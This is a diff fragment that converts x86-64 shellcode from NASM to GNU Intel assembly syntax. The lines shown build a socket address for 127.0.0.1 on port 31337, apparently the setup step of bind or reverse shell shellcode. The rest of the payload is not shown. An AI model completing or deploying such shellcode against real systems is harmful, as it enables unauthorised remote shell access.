@@ -1,5 +1,5 @@
-BITS 64
-global _start
+.intel_syntax noprefix
+.globl _start
 _start:
     xor rax,rax
     xor rdi,rdi
@@ -19,9 +19,9 @@ _start:
     xor rsi,rsi
     xor r10,r10
     push r10
-    mov byte [rsp],0x2
-    mov word [rsp+0x2],0x697a ; 31337
-    mov dword [rsp+0x4],0x100007f ; hex(u32(binary_ip('')))
+    mov byte ptr [rsp],0x2
+    mov word ptr [rsp+0x2],0x697a # 31337
+    mov dword ptr [rsp+0x4],0x100007f # hex(u32(binary_ip('')))
 
     mov rsi,rsp
     push 0x10
